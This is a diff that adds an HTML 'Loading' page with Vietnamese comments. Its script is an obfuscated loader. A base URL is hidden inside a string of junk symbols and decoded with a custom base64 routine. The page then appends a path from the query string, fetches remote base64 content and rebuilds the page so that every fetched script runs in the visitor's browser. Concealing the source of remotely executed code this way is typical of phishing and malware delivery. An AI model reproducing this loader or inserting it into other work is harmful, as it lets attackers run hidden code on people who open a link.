@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <style>
+    body {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      padding: 1rem;
+      white-space: pre-wrap;
+    }
+  </style>
+</head>
+<body>	
+  <div id="loading">Loading</div>
+
+  <script>
+function deobfuscate(input) {
+  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+  let str = input.replace(/=+$/, "");
+  let output = [];
+
+  for (let bc = 0, bs = 0, buffer, i = 0; (buffer = str.charAt(i++));) {
+    const charIndex = chars.indexOf(buffer);
+    if (charIndex === -1) continue;
+
+    bs = (bs << 6) | charIndex;
+    bc += 6;
+    if (bc >= 8) {
+      bc -= 8;
+      output.push((bs >> bc) & 0xff);
+    }
+  }
+
+  return new TextDecoder().decode(new Uint8Array(output));
+}
+
+
+    const originalWrite = document.write;
+    const originalWriteln = document.writeln;
+
+    function blockDocumentWrite() {
+      const warn = "[⚠️ BLOCKED] document.write đã bị vô hiệu";
+      document.write = (...args) => {
+        console.warn(warn, args.join(""));
+        const pre = document.createElement("pre");
+        pre.style.color = "orange";
+        pre.textContent = warn + "\n" + args.join("");
+        document.body.appendChild(pre);
+      };
+      document.writeln = (...args) => document.write(...args, "\n");
+    }
+
+    (async () => {
+      try {
+        const query = location.search.slice(1);
+        if (!query) throw new Error("❌ Không tìm thấy ? ");
+
+	const bimat = "%&#&@^%#&)@" + "@$@@@$&%%%()@&^!()*^#" + "#(@%!@!@#(!*(#&#&$)#&^)" + "(*a&)#(&%^(&%^H**%%$***!#^&$&(&$$&$($^)@!@*##&" + "$^&&&*#*^@))#)!@*^()^^%%^!@!%*%^*##@*^@#)^!^*%)@()@$@#@@&)!&#@^!(&@$^(*^*^*$)$(&#!@@*%&*^*(&#^(#^&%^@^#(&^*&@*^)*^!^!$%!@@(@@#%*^()^@&%)$^)%@&^%(R#%&^&&(@^0!^()@#)&$!&#!%$$!)^^$^@$#(@%(@!&&%^$^!$%#(^$&($$@$%^@**&((@@$((*$^(%$@(*($^)@%*&!#^&###^&#$c@" + "($&)(%$#@$!" + "%#!))%&$)#$@%^%!@!$!**#$*^%@^#" + "^&$^&#H#&^#^&#M#&%#^&#6#*#L#^&#&!!!^!%!^##*((^(*^*$*(%@&**#%^(%*@^%^" + "^!$@&y^&#&9#^%(^)^(^!##^$&(@)%&#*@!#!*)(^)^!%^*&*#^$%#@#$m#^&*#^&(c^#&$m%&$%!#*$!^$^*^*%($@)&%@)*)&*$$!%&^*&%^#!(#%($$^&@l%^&@%$*#^**&*)$(^&^@@^$@$)$$#^)$#&(^&$&*#^)!$#&*(@$%@!%$(&*&)$*%$!#^)^*!&!%!(!!%!#!)&)#^@#l^&@)!&#$^&&(^&&(**^$!&&#^(%)(()$%&^@(@^)*(!!%&#@b@^&(%!@^&m^!^!&(!)!^#(^*%^)@(($*#@^" + "!!$))$*)&#(**^%@" + "@%)##$(@^#&^&!!#^$!%!^(&!)^@$()*&%&*#@()()!))%(**^&(^^&!^)#^(&&&@**)(!^%#$#^!()#*&!%&@@&%&R&)*%$##^$%$*)%&&##%#*#&$$!*%!#)%*%(!" + "*)@*&&%@^@(@*&" + "w$$&&)^(!)$$&!#$@^@$*(#^#&#()@(!*!^@*@%&!)^)@(@Y" + "!&@()X@&&@&(@N&@&&)(^@))&(@)$%(^&@%(@*)&)(###@*%&)^)%@)!)$*^&@0@&^%&@(Z((#&#&(S&#^!$!&$&&)$^!&!!))*#&(@!@(#&)^^%(@!@*&!^@%*&^#&^" + "#&5#(()@^&@&@^)&%$!)@!&*&*(*#&*))#%#)&!##%@^)&))^@%@(j$^^&@*(b#@@#%(2@#&()@0@#^*!#*)%)%#@)$*!!&^@%%^%!@@^*&@$#*%@^%)(^^&&&@#&(^v@#&)()!*(^#^$%^*(!^@$(%%&%!@(&*%*^!%$(&@&!^*^!@#^&@#@#";
+        const pastePath = deobfuscate(query);
+        const url = deobfuscate(bimat) + pastePath;
+
+        const res = await fetch(url);
+        if (!res.ok) throw new Error("❌ Lỗi khi tải nội dung");
+
+        const encoded = await res.text();
+        const base64 = encoded.trim();
+
+        let html;
+        try {
+          html = deobfuscate(base64);
+        } catch {
+          throw new Error("❌ Dữ liệu không phải là hợp lệ");
+        }
+
+        // Cho phép document.write tạm thời
+        document.write = originalWrite;
+        document.writeln = originalWriteln;
+
+        const parser = new DOMParser();
+        const doc = parser.parseFromString(html, "text/html");
+
+        // Xóa toàn bộ trang hiện tại
+        document.documentElement.innerHTML = "<head></head><body></body>";
+
+        // Gắn lại HEAD
+        Array.from(doc.head.children).forEach(el => {
+          if (el.tagName.toLowerCase() === "script") {
+            const s = document.createElement("script");
+            if (el.src) s.src = el.src;
+            if (el.type) s.type = el.type;
+            s.textContent = el.textContent;
+            document.head.appendChild(s);
+          } else {
+            document.head.appendChild(el.cloneNode(true));
+          }
+        });
+
+        // Gắn lại BODY
+        Array.from(doc.body.childNodes).forEach(node => {
+          if (node.tagName === "SCRIPT") {
+            const s = document.createElement("script");
+            if (node.src) s.src = node.src;
+            if (node.type) s.type = node.type;
+            s.textContent = node.textContent;
+            document.body.appendChild(s);
+          } else {
+            document.body.appendChild(node.cloneNode(true));
+          }
+        });
+
+        // Sau khi render xong, block lại document.write
+        blockDocumentWrite();
+
+      } catch (err) {
+        document.body.innerHTML = `<pre style="color:red;padding:2rem;">Lỗi: ${err.message}</pre>`;
+        console.error("[Lỗi]", err);
+      }
+    })();
+  </script>
+</body>
+</html>
